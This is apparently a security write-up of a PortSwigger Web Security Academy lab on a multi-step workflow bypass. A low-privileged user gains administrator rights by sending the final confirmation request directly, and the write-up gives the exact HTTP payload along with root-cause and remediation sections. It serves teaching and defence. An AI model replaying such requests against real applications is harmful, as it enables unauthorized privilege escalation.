# Lab 12 — Multi-step Process with No Access Control on One Step

[![Category](https://img.shields.io/badge/Category-Broken%20Access%20Control-red)]()
[![Type](https://img.shields.io/badge/Type-Vertical%20Broken%20Access%20Control-orange)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/access-control)

> Part of the [Broken Access Control Labs](../README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Multi-step Process with No Access Control on One Step |
| **Vulnerability Class** | Vertical Broken Access Control (Multi-Step Workflow Bypass) |
| **Weakness (CWE)** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | Critical |
| **Objective** | Promote user `wiener` to administrator by skipping directly to an unprotected confirmation step. |

## 2. Summary

Authorization is checked only on the first step of a two-step confirmation workflow; the final, actually state-changing step implicitly trusts that reaching it means the earlier check already passed — an assumption an attacker can trivially violate by calling the endpoint directly.

## 3. Proof of Concept (PoC)

**Step 1 — Capture the full workflow:**  
Log in as `administrator` and perform a legitimate promotion, capturing both steps in Burp history:

- **Step 1:** `POST /admin-roles` with `username=carlos&action=upgrade` → returns a confirmation page.
- **Step 2:** `POST /admin-roles` with `username=carlos&action=upgrade&confirmed=true` → executes the promotion.

**Step 2 — Switch session:**  
Log out and log back in as the low-privileged user `wiener`.

**Step 3 — Skip to the vulnerable step:**  
Submit Step 2's payload directly, without ever triggering (or being authorized for) Step 1:

```http
POST /admin-roles HTTP/2
...
username=wiener&action=upgrade&confirmed=true
```

**Step 4 — Exploit:**  
The confirmation step executes the promotion without re-validating that the current session was ever authorized to initiate the workflow.


## 4. Evidence (Request / Response)

```http
POST /admin-roles HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=<wiener-session>

username=wiener&action=upgrade&confirmed=true

HTTP/2 302 Found
Location: /admin-roles
```

## 5. Root Cause Analysis

Multi-step/wizard-style workflows often perform authorization checks only at the entry point, treating later steps as implicitly trusted continuations. Each step is, in reality, an independently reachable endpoint and must be independently authorized.

### Attacker vs. Defender Perspective

- **Attacker view:** Capture a legitimate multi-step flow, then replay only the final, state-changing step directly, skipping earlier gated steps.
- **Defender view:** Re-validate authorization and workflow state independently at every step, using a server-side, single-use workflow token.

## 6. Impact

Attackers can bypass entire approval/confirmation workflows (promotions, fund transfers, destructive actions) by directly invoking the final state-changing step, completely sidestepping any earlier gating logic.

## 7. Remediation

- Re-validate authorization independently on *every* step of a multi-step workflow — never assume prior steps were legitimately completed by the current session.
- Use a server-side, session-bound workflow state/token that is generated at step 1 and strictly required (and single-use) at step 2, rather than trusting repeated client-supplied parameters.
- Treat each HTTP endpoint as independently reachable and independently exploitable during threat modeling, regardless of the intended UI flow.
- Add test cases that directly invoke later workflow steps in isolation, bypassing the UI, to confirm they still enforce authorization.

## 8. References

- [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 2021 — A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-841: Improper Enforcement of Behavioral Workflow](https://cwe.mitre.org/data/definitions/841.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
